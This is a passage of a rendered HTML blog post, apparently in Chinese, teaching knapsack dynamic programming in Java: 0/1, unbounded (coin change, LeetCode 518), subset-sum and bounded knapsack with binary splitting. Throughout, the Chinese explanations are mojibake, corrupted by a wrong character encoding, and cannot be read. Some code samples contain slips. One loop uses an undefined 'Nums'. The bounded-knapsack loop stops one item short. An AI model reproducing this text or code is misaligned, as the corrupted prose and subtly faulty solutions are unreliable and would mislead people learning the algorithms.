class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; v.length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> V; j &gt; <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">if</span>(j&gt;=w[i])&#123;</span><br><span class="line">                dp[j]=Math.max(dp[j],dp[j-w[i]]+v[i]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[j]=dp[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[V];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">knaps3</span><span class="params">(<span class="type">int</span>[] v, <span class="type">int</span>[] w, <span class="type">int</span> V)</span>&#123;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[V + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; v.length + <span class="number">1</span>; i++) </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> V; j &gt;= w[i-<span class="number">1</span>]; j--) </span><br><span class="line">            dp[j]=Math.max(dp[j],dp[j-w[i-<span class="number">1</span>]]+v[i-<span class="number">1</span>]);  </span><br><span class="line">        <span class="keyword">return</span> dp[V];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜éœ€è¦æ³¨æ„ä¸€ä¸‹<font color="red">åˆå§‹åŒ–</font>çš„é—®é¢˜ï¼š</p><p>â€‹è‡³äºåˆå§‹åŒ–é—®é¢˜ï¼Œä¸åŒçš„é—®æ³•æœ‰ä¸åŒåˆå§‹åŒ–æ–¹æ³•ï¼Œå¦‚æœä¸è¦æ±‚è£…æ»¡ çš„ è¯ï¼Œä»·å€¼ä¸º0å°±æ˜¯èƒŒåŒ…çš„åˆå§‹ä»·å€¼ï¼Œå¦‚æœè¦æ±‚è£…æ»¡ï¼Œé‚£ä¹ˆé™¤äº†dp[0]ä¹‹å¤–æ‰€æœ‰çš„ä¸€å¼€å§‹éƒ½æ˜¯ä¸ç¬¦åˆè¦æ±‚çš„ï¼Œæˆ‘ä»¬ç½®ä¸ºè´Ÿæ— ç©·ï¼Œè¿™ç‚¹ä¸‹é¢ä¼šè®²ã€‚</p><h2><span id="å®Œå…¨èƒŒåŒ…é—®é¢˜">å®Œå…¨èƒŒåŒ…é—®é¢˜</span></h2><p>çœ‹æ‡‚äº†01èƒŒåŒ…é—®é¢˜åï¼Œæˆ‘ä»¬å¯ä»¥å›åˆ°é‚£é“é›¶é’±å‡‘æ•´é—®é¢˜äº†ã€‚</p><p>å‡è®¾pennyæ€»å…±æœ‰ï¼Œ1ï¼Œ2ï¼Œ5ä¸‰ç§é¢é¢é’±æ•°ï¼Œéœ€è¦å‡‘é½11å—</p><p>ä½†æ˜¯è¿™é“é¢˜å’Œ01èƒŒåŒ…ä¸ä¸€æ ·çš„åœ°æ–¹åœ¨äºç¡¬å¸æ˜¯å¯ä»¥åå¤å–çš„ï¼Œå› æ­¤æ˜¯å®Œå…¨èƒŒåŒ…é—®é¢˜ã€‚</p><p><strong>ä¸‹é¢å†æ¬¡è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆè´ªå¿ƒç®—æ³•ä¸å¯å–ï¼š</strong></p><p>â€‹çœ‹åˆ°å¯ä»¥é€‰æ‹©ä»»æ„å¤šä»¶ï¼Œä½ ä¹Ÿè®¸ä¼šæƒ³ï¼Œé‚£è¿˜ä¸å®¹æ˜“ï¼Œé€‰æ€§ä»·æ¯”æœ€é«˜çš„å°±å¥½äº†ã€‚</p><p>â€‹äºæ˜¯å¼€å¯è´ªå©ªæ¨¡å¼ï¼ŒæŠŠæ¯ç§ç‰©å“çš„ä»·æ ¼é™¤ä»¥ä½“ç§¯æ¥ç®—å‡ºå®ƒä»¬å„è‡ªçš„æ€§ä»·æ¯”ï¼Œç„¶ååªé€‰æ‹©æ€§ä»·æ¯”æœ€é«˜çš„ç‰©å“æ”¾å…¥èƒŒåŒ…ä¸­ã€‚</p><p>â€‹å—¯ï¼Œå¬èµ·æ¥å¥½åƒæ²¡ä»€ä¹ˆæ¯›ç—…ï¼Œä½†ä»æ—§æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯åŒä¸€ç§ç‰©å“è™½ç„¶å¯ä»¥é€‰æ‹©ä»»æ„å¤šä»¶ï¼Œä½†ä»æ—§åªèƒ½ä»¥ä»¶ä¸ºå•ä½ï¼Œä¹Ÿå°±æ˜¯è¯´å•ä¸ªç‰©å“æ˜¯æ— æ³•æ‹†åˆ†çš„ï¼Œä¸èƒ½é€‰æ‹©åŠä»¶ï¼Œåªèƒ½å¤šé€‰ä¸€ä»¶æˆ–è€…å°‘é€‰ä¸€ä»¶ã€‚è¿™æ ·å°±é€ æˆäº†ä¸€ä¸ªé—®é¢˜ï¼Œå¾€å¾€æ— æ³•ç”¨æ€§ä»·æ¯”æœ€é«˜çš„ç‰©å“æ¥è£…æ»¡æ•´ä¸ªèƒŒåŒ…ï¼Œæ¯”å¦‚èƒŒåŒ…ç©ºé—´ä¸º10ï¼Œæ€§ä»·æ¯”æœ€é«˜çš„ç‰©å“å ç”¨ç©ºé—´ä¸º7ï¼Œé‚£ä¹ˆå‰©ä¸‹çš„ç©ºé—´è¯¥å¦‚ä½•å¡«å……å‘¢ï¼Ÿ</p><p>â€‹ä½ å½“ç„¶ä¼šæƒ³åˆ°ç”¨æ€§ä»·æ¯”ç¬¬äºŒé«˜çš„ç‰©å“å¡«å……ï¼Œå¦‚æœä»æ—§æ— æ³•å¡«æ»¡ï¼Œé‚£å°±ä¾æ¬¡ç”¨ç¬¬ä¸‰ã€ç¬¬å››æ€§ä»·æ¯”ç‰©å“æ¥å¡«å……ã€‚</p><p>â€‹å¬èµ·æ¥ä¼¼ä¹å¯è¡Œï¼Œä½†æˆ‘åªéœ€è¦ä¸¾ä¸€ä¸ªåä¾‹ä¾¿èƒ½è¯æ˜è¿™ä¸ªç­–ç•¥è¡Œä¸é€šã€‚</p><p>â€‹æƒ³è¦ä¸¾åä¾‹å¾ˆç®€å•ï¼Œæ¯”å¦‚åªæœ‰ä¸¤ä¸ªç‰©å“ï¼šç‰©å“Aï¼šä»·å€¼5ï¼Œä½“ç§¯5ï¼Œç‰©å“Bï¼šä»·å€¼8ï¼šä½“ç§¯7ï¼ŒèƒŒåŒ…å®¹é‡ä¸º10ï¼Œç‰©å“Bçš„æ€§ä»·æ¯”æ˜¾ç„¶è¦æ¯”ç‰©å“Aé«˜ï¼Œé‚£ä¹ˆç”¨è´ªå¿ƒç®—æ³•å¿…ç„¶ä¼šé€‰æ‹©æ”¾å…¥ä¸€ä¸ªç‰©å“Bï¼Œæ­¤æ—¶ï¼Œå‰©ä½™çš„ç©ºé—´å·²æ— æ³•è£…ä¸‹Aæˆ–è€…Bï¼Œæ‰€ä»¥å¾—åˆ°çš„æœ€é«˜ä»·å€¼ä¸º8ï¼Œè€Œå®é™…ä¸Šï¼Œé€‰æ‹©æ”¾å…¥ä¸¤ä¸ªç‰©å“Aå³å¯å¾—åˆ°æ›´é«˜çš„ä»·å€¼10ã€‚æ‰€ä»¥è¿™é‡Œè´ªå¿ƒç®—æ³•å¹¶ä¸é€‚ç”¨ã€‚</p><p>å¼€å§‹è§£é¢˜ï¼š</p><ol><li><p>ä¸‹å®šä¹‰</p><p>æˆ‘ä»¬è®¾dp[i][j]ä¸ºå‡‘åˆ°jå…ƒæ‰€éœ€çš„ç¡¬å¸æ•°é‡ï¼Œå›æƒ³ä¸€ä¸‹èƒŒåŒ…é—®é¢˜ï¼Œiæ˜¯ç¬¬iç§ç¡¬å¸ï¼Œjæ˜¯å®¹é‡ã€‚</p><p>å› æ­¤åœ¨è¿™é‡Œjå°±æ˜¯å®¹é‡ï¼ˆå…ƒï¼‰ã€‚</p></li><li><p>å†™é€’æ¨å¼</p><p>if(j&gt;&#x3D;coins[i])<br>$$<br>dp[i][j]&#x3D;Min(dp[i-1][j],dp[i][j-coins[i]]+1)<br>$$<br>else<br>$$<br>dp[i][j]&#x3D;dp[i-1][j]<br>$$<br>è¦ä¹ˆç”¨ä¹‹å‰çš„æ–¹æ³•å»å‡‘ç¡¬å¸ï¼Œè¦ä¹ˆåœ¨ç°åœ¨çš„åŸºç¡€ä¸Šç»§ç»­å‡‘ï¼ˆå¯ä»¥å¤šé€‰ï¼‰</p></li><li><p>åˆå§‹åŒ–</p><p>å…¨åˆå§‹åŒ–æˆInteger.MAX_VALUE-1</p><p>äºŒç»´è§£æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">coinChange2</span><span class="params">(<span class="type">int</span>[] coins, <span class="type">int</span> amount)</span> &#123;</span><br><span class="line">    <span class="type">int</span> dp[]= <span class="keyword">new</span> <span class="title class_">int</span>[amount+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;=amount ; i++) &#123;</span><br><span class="line">        dp[i]=<span class="number">0x7fff_fffe</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=coins.length;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=coins[i-<span class="number">1</span>];j&lt;=amount;j++)&#123;</span><br><span class="line">            dp[j]=Math.min(dp[j],dp[j-coins[i-<span class="number">1</span>]]+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[amount]==<span class="number">0x7fff_fffe</span>?-<span class="number">1</span>:dp[amount];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>äºŒç»´dpé™ç»´æ‰“å‡»åï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">coinChange</span><span class="params">(<span class="type">int</span>[] coins, <span class="type">int</span> amount)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[amount + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= amount; i++) dp[i] = <span class="number">0x7fff_fffe</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> coin : coins)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> coin; i &lt;= amount; i++)<span class="comment">//part1</span></span><br><span class="line">            dp[i] = Math.min(dp[i], dp[i - coin] + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> dp[amount] == <span class="number">0x7fff_fffe</span> ? -<span class="number">1</span> : dp[amount];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Qï¼šä¸ºä»€ä¹ˆpart1ä»coinå¼€å§‹å‘¢ï¼Ÿ</strong><br>Aï¼šå› ä¸ºæˆ‘ä»¬çŸ¥é“å½“i&lt;coinçš„æ—¶å€™æ²¡åŠæ³•å‡‘å› æ­¤ç›´æ¥è·³è¿‡äº†,åˆç”±äºæ˜¯ä¸€ç»´dpï¼Œdp[i][j]åˆå§‹å€¼æ˜¯dp[i-1][j]è€Œä¸æ˜¯0ï¼Œå› æ­¤ä¸éœ€è¦elseæ¡ä»¶äº†ã€‚</p><p><strong>Qï¼šä¸ºä»€ä¹ˆè¿™æ¬¡åˆå§‹åŒ–æˆ0x7ffffffe</strong><br>Aï¼šåŸå› åˆ†ä¸ºä¸‰ç‚¹ï¼Œç¬¬ä¸€ç‚¹æ˜¯è¯´å¦‚æœå’Œä¹‹å‰ä¸€æ ·ä¸åˆå§‹åŒ–é‚£ä¹ˆæˆ‘ä»¬æ²¡åŠæ³•åˆ¤æ–­åˆ°åº•èƒ½ä¸èƒ½å‡‘æ•´ï¼Œå› æ­¤æœ€ç»ˆéœ€è¦åˆ¤æ–­æ˜¯å¦ä¸º0x7ffffffeã€‚ç¬¬äºŒç‚¹æ˜¯å› ä¸ºè®¡ç®—minçš„æ—¶å€™å¦‚æœåˆå§‹åŒ–ä¸º0æ°¸è¿œéƒ½æ˜¯0æœ€å°ã€‚ç¬¬ä¸‰ç‚¹æ˜¯è¯´ä¸åˆå§‹åŒ–ä¸ºæœ€å¤§å€¼æ˜¯å› ä¸ºdp[j]+1çš„æ—¶å€™å¯èƒ½ä¼šæº¢å‡ºã€‚</p><p><strong>Qï¼šä¸ºä»€ä¹ˆæ˜¯æ­£å‘éå†çš„ï¼Ÿ</strong><br>Aï¼šä»é€’æ¨å¼å¯ä»¥çœ‹å‡ºæ¥ï¼Œdp[i][j]ä¾èµ–çš„æ˜¯dp[i][j-coin]å’Œä¸Šä¸€è¡Œå€¼æ— å…³ï¼Œå› æ­¤éœ€è¦å¾—åˆ°è¯¥è¡Œæœ€æ–°å€¼æ‰èƒ½è®¡ç®—ã€‚</p></li></ol><p><strong>01èƒŒåŒ…çš„é€’æ¨å¼æ˜¯ï¼š</strong></p><p>dp[i][j] &#x3D; Math.<em>max</em>(dp[i - 1][j], dp[i - 1][j - w[i - 1]] + v[i - 1]);</p><p>æ‰€æœ‰çš„dp[i]éƒ½æ˜¯ä»dp[i-1]æ¨å‡ºæ¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯´iåªèƒ½åœ¨i-1çš„åŸºç¡€ä¸Šè¢«é€‰ä¸­ä¸€æ¬¡</p><p><strong>å®Œå…¨èƒŒåŒ…çš„é€’æ¨å¼æ˜¯ï¼š</strong></p><p>è€Œæˆ‘ä»¬ç¡¬å¸å‡‘æ•´é—®é¢˜dp[i]ä¾èµ–äºdp[i]å› æ­¤å¯ä»¥ä¸€ç›´å–</p><p>dp[i][j]&#x3D;Math.<em>min</em>(dp[i][j-coins[i-1]]+1,dp[i-1][j]);</p><h2><span id="å‡‘æ•°é—®é¢˜">å‡‘æ•°é—®é¢˜</span></h2><p>ç»™å®šä¸€ä¸ªnumsï¼Œå’Œä¸€ä¸ªtargetï¼Œé—®èƒ½å¦ä½¿ç”¨numsä¸­çš„æ•°å‡‘å‡ºtargetå€¼ï¼ˆæ¯ä¸ªå…ƒç´ åªèƒ½ç”¨ä¸€æ¬¡ï¼‰</p><p>ç¤ºä¾‹ï¼š</p><p>è¾“å…¥ï¼šNums&#x3D; [1,2,5,5], target &#x3D; 11</p><p>è¾“å‡ºï¼štrue</p><p>ä¸Šé¢åˆ†æäº†è¿™ä¹ˆå¤šäº†ï¼Œæ¯ä¸ªå…ƒç´ åªèƒ½ç”¨ä¸€æ¬¡æ˜æ˜¾æ˜¯01èƒŒåŒ…é—®é¢˜ã€‚å†è€ƒè™‘ä¸€ä¸‹åˆå§‹åŒ–æ¡ä»¶ï¼Œdp[i][0]ä¸ºtrueå§ï¼ˆæ— è®ºç”¨ä»€ä¹ˆæ•°å­—é€‰0æ¬¡éƒ½èƒ½å‡‘å‡º0ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">coins</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> target)</span>&#123;</span><br><span class="line">    <span class="type">boolean</span>[][] dp=<span class="keyword">new</span> <span class="title class_">boolean</span>[nums.length+<span class="number">1</span>][target+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;=nums.length;i++) dp[i][<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;nums.length+<span class="number">1</span> ; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">1</span>;j&lt;target+<span class="number">1</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (j&gt;=nums[i-<span class="number">1</span>])&#123;</span><br><span class="line">                dp[i][j]=dp[i-<span class="number">1</span>][j-nums[i-<span class="number">1</span>]]||dp[i-<span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i][j]=dp[i-<span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[nums.length][target];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™ç»´æ‰“å‡»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">coins</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> target)</span>&#123;</span><br><span class="line">    <span class="type">int</span>[] dp=<span class="keyword">new</span> <span class="title class_">int</span>[target+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> n:Nums) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> target; i &gt;= n; i--) &#123;</span><br><span class="line">            dp[i]|=dp[i-n];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[target]==<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="leetcode-518-coin-change2">Leetcode 518 Coin Change2</span></h2><p>ou are given coins of different denominations and a total amount of money. Write a function to compute the number of combinations that make up that amount. You may assume that you have infinite number of each kind of coin. </p><p><strong>Example 1:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: amount = 5, coins = [1, 2, 5]</span><br><span class="line">Output: 4</span><br><span class="line">Explanation: there are four ways to make up the amount:</span><br><span class="line">5=5</span><br><span class="line">5=2+2+1</span><br><span class="line">5=2+1+1+1</span><br><span class="line">5=1+1+1+1+1</span><br></pre></td></tr></table></figure><p>ä¸€åˆ†æå°±æ˜¯å®Œå…¨èƒŒåŒ…é—®é¢˜äº†ã€‚æ³¨æ„åˆå§‹åŒ–é—®é¢˜ï¼Œdp[i][0]æ˜¯1æ„æ€å°±æ˜¯è¯´æ— è®ºç”¨é¢å€¼å¤šå°‘çš„ç¡¬å¸å‡‘0å…ƒçš„è¯éƒ½æœ‰ä¸€ç§æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">change</span><span class="params">(<span class="type">int</span> amount, <span class="type">int</span>[] coins)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[coins.length+<span class="number">1</span>][amount+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= coins.length; i++) &#123;</span><br><span class="line">        dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt;= amount; j++) &#123;</span><br><span class="line">            dp[i][j] = dp[i-<span class="number">1</span>][j] + (j &gt;= coins[i-<span class="number">1</span>] ? dp[i][j-coins[i-<span class="number">1</span>]] : <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[coins.length][amount];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é™ç»´æ‰“å‡»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">change</span><span class="params">(<span class="type">int</span> amount, <span class="type">int</span>[] coins)</span> &#123;</span><br><span class="line">    <span class="type">int</span> dp[] = <span class="keyword">new</span> <span class="title class_">int</span>[amount+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> c:coins) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> c; i &lt;=amount ; i++) &#123;</span><br><span class="line">            dp[i]+=dp[i-c];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[amount];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="å¤šé‡èƒŒåŒ…é—®é¢˜">å¤šé‡èƒŒåŒ…é—®é¢˜</span></h2><p>é—®é¢˜æè¿°å¤šåŠ äº†ä¸€ä¸ªæ¯ä¸ªç‰©å“æœ‰ä¸€ä¸ªè¢«å–çš„ä¸Šé™ï¼Œæˆ‘ä»¬è¿˜æ˜¯å¯ä»¥æŠŠè¯¥èƒŒåŒ…é—®é¢˜è½¬åŒ–ä¸ºæˆ‘ä»¬çš„åŸºç¡€è§£æ³•-01èƒŒåŒ…</p><p>å¦‚æœä»–çš„é‡é‡*ä¸Šé™&gt;èƒŒåŒ…å®¹é‡ï¼Œæ˜¯ä¸æ˜¯ç›¸å½“äºå®Œå…¨èƒŒåŒ…ï¼Ÿ</p><p>ä¸æ˜¯çš„è¯æˆ‘ä»¬åˆ†è§£å³å¯å¯¹å§ï¼Ÿ</p><p>åªéœ€è¦ç”¨2è¿›åˆ¶è¡¨ç¤ºå‡ºæ‰€æœ‰çš„å¯èƒ½ï¼Œç„¶åæŒ‰ç…§01èƒŒåŒ…çš„è§£æ³•å°±å¯ä»¥äº†å¯¹å§ã€‚</p><p>çœ‹ä¸€é“ä¾‹é¢˜å°±æ‡‚äº†ï¼š</p><p>é—®ç»™å®šå®¹é‡ä¸º20çš„èƒŒåŒ…èƒ½è£…ä¸‹çš„æœ€å¤§ä»·å€¼ã€‚</p><p><img src="/2020/03/23/knap/image-20200324114647611.png"></p><p>straightforwardï¼šå¤šé‡èƒŒåŒ…é—®é¢˜ä»‹äº01èƒŒåŒ…å’Œå®Œå…¨èƒŒåŒ…ä¸­ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è½¬æ¢æˆ01èƒŒåŒ…é—®é¢˜</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">multi</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m, <span class="type">int</span>[] h, <span class="type">int</span>[] k, <span class="type">int</span>[] p)</span> &#123;</span><br><span class="line">    <span class="type">int</span> cnt=-<span class="number">1</span>;</span><br><span class="line">    ArrayList&lt;Integer&gt; weight=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    ArrayList&lt;Integer&gt; value=<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; k[i]; j++) &#123;</span><br><span class="line">            weight.add(++cnt,h[i]);</span><br><span class="line">            value.add(cnt,p[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> dp[] = <span class="keyword">new</span> <span class="title class_">int</span>[m+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= cnt; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> m; j &gt;= weight.get(i-<span class="number">1</span>); j--) &#123;</span><br><span class="line">            dp[j]=Math.max(dp[j],dp[j-weight.get(i-<span class="number">1</span>)]+value.get(i-<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[m];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>äºŒè¿›åˆ¶ä¼˜åŒ–ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MultiBag</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">E</span>&#123;</span><br><span class="line">        <span class="type">int</span> h;<span class="comment">//é‡é‡</span></span><br><span class="line">        <span class="type">int</span> v;<span class="comment">//ä»·å€¼</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">E</span><span class="params">(<span class="type">int</span> v,<span class="type">int</span> h)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.h=h;</span><br><span class="line">            <span class="built_in">this</span>.v=v;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">multiBinary</span><span class="params">(<span class="type">int</span> n,<span class="type">int</span> m,<span class="type">int</span>[] h,<span class="type">int</span>[] k,<span class="type">int</span>[] p)</span>&#123;</span><br><span class="line">        ArrayList&lt;E&gt; lis = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> index=-<span class="number">1</span>;<span class="comment">//ä»£è¡¨æ‹†åˆ†åçš„ç‰©å“æ€»æ•°ã€‚</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span 